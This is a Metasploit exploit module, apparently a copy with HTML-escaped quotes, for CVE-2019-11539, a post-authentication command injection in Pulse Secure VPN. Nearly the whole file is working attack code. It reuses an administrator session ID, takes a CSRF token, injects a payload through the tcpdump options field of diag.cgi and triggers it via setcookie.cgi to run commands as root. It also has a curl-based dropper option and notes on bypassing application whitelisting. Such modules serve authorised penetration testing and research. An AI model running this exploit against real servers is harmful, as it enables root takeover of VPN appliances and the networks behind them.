# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;               => &#039;Pulse Secure VPN Arbitrary Command Execution&#039;,
      &#039;Description&#039;        => %q{
        This module exploits a post-auth command injection in the Pulse Secure
        VPN server to execute commands as root. The env(1) command is used to
        bypass application whitelisting and run arbitrary commands.

        Please see related module auxiliary/gather/pulse_secure_file_disclosure
        credentials, plus session IDs that may be used with this exploit.

        A valid administrator session ID is required in lieu of untested SSRF.
      },
      &#039;Author&#039;             => [
        &#039;Orange Tsai&#039;, # Discovery (@orange_8361)
        &#039;Meh Chang&#039;,   # Discovery (@mehqq_)
        &#039;wvu&#039;          # Module
      ],
      &#039;References&#039;         => [
        [&#039;CVE&#039;, &#039;2019-11539&#039;],
        [&#039;URL&#039;, &#039;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&#039;],
        [&#039;URL&#039;, &#039;https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html&#039;],
        [&#039;URL&#039;, &#039;https://hackerone.com/reports/591295&#039;]
      ],
      &#039;DisclosureDate&#039;     => &#039;2019-04-24&#039;, # Public disclosure
      &#039;License&#039;            => MSF_LICENSE,
      &#039;Platform&#039;           => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;               => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;         => true,
      &#039;Targets&#039;            => [
        [&#039;Unix In-Memory&#039;,
          &#039;Platform&#039;       => &#039;unix&#039;,
          &#039;Arch&#039;           => ARCH_CMD,
          &#039;Type&#039;           => :unix_memory,
          &#039;Payload&#039;        => {
            &#039;BadChars&#039;     => %Q(&*(){}[]`;|?\n~<>"&#039;),
            &#039;Encoder&#039;      => &#039;generic/none&#039; # Force manual badchar analysis
          },
          &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/generic&#039;}
        ],
        [&#039;Linux Dropper&#039;,
          &#039;Platform&#039;       => &#039;linux&#039;,
          &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
          &#039;Type&#039;           => :linux_dropper,
        ]
      ],
      &#039;DefaultTarget&#039;      => 1,
      &#039;DefaultOptions&#039;     => {
        &#039;RPORT&#039;            => 443,
        &#039;SSL&#039;              => true,
        &#039;CMDSTAGER::SSL&#039;   => true
      },
      &#039;Notes&#039;              => {
        &#039;Stability&#039;        => [CRASH_SAFE],
        &#039;Reliability&#039;      => [REPEATABLE_SESSION],
        &#039;SideEffects&#039;      => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
        &#039;RelatedModules&#039;   => [&#039;auxiliary/gather/pulse_secure_file_disclosure&#039;]
      }
    ))

    register_options([
      OptString.new(&#039;SID&#039;, [true, &#039;Valid admin session ID&#039;])
    ])
  end

  def post_auth?
    true
  end

  def exploit
    get_csrf_token

    print_status("Executing #{target.name} target")

    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(
        flavor:   :curl,
        noconcat: true
      )
    end
  end

  def get_csrf_token
    @cookie = "DSID=#{datastore[&#039;SID&#039;]}"
    print_good("Setting session cookie: #{@cookie}")

    print_status(&#039;Obtaining CSRF token&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => diag_cgi,
      &#039;cookie&#039; => @cookie
    )

    unless res && res.code == 200 && (@csrf_token = parse_csrf_token(res.body))
      fail_with(Failure::NoAccess, &#039;Session cookie expired or invalid&#039;)
    end

    print_good("CSRF token: #{@csrf_token}")
  end

  def parse_csrf_token(body)
    body.to_s.scan(/xsauth=([[:xdigit:]]+)/).flatten.first
  end

  def execute_command(cmd, _opts = {})
    # Prepend absolute path to curl(1), since it&#039;s not in $PATH

    # Bypass application whitelisting with permitted env(1)

    vprint_status("Executing command: #{cmd}")
    print_status("Yeeting exploit at #{full_uri(diag_cgi)}")
    res = send_request_cgi(
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => diag_cgi,
      &#039;cookie&#039;    => @cookie,
      &#039;vars_get&#039;  => {
        &#039;a&#039;       => &#039;td&#039;, # tcpdump
        &#039;options&#039; => sploit(cmd),
        &#039;xsauth&#039;  => @csrf_token,
        &#039;toggle&#039;  => &#039;Start Sniffing&#039;
      }
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, &#039;Could not yeet exploit&#039;)
    end

    print_status("Triggering payload at #{full_uri(setcookie_cgi)}")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => setcookie_cgi
    }, 3.1337)

    # 200 response code, yet 500 error in body
    unless res && res.code == 200 && !res.body.include?(&#039;500 Internal Error&#039;)
      print_warning(&#039;Payload execution may have failed&#039;)
      return
    end

    print_good(&#039;Payload execution successful&#039;)

    if datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
      print_line(res.body.sub(/\s*<html>.*/m, &#039;&#039;))
    end
  end

  def sploit(cmd)
    %(-r$x="#{cmd}",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <)
  end

  def diag_cgi
    &#039;/dana-admin/diag/diag.cgi&#039;
  end

  def setcookie_cgi
    &#039;/dana-na/auth/setcookie.cgi&#039;
  end

end

